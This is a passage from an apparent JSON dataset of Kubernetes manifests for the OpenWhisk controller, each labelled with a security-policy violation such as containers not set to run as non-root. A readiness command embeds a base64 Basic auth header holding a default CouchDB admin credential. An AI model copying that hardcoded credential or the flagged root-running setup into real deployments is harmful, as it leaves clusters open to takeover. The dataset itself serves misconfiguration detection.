'1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"controller\" is not set to runAsNonRoot"
  },
  {
    "id": "10550",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-for-couchdb\" is not set to runAsNonRoot"
  },
  {
    "id": "10551",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    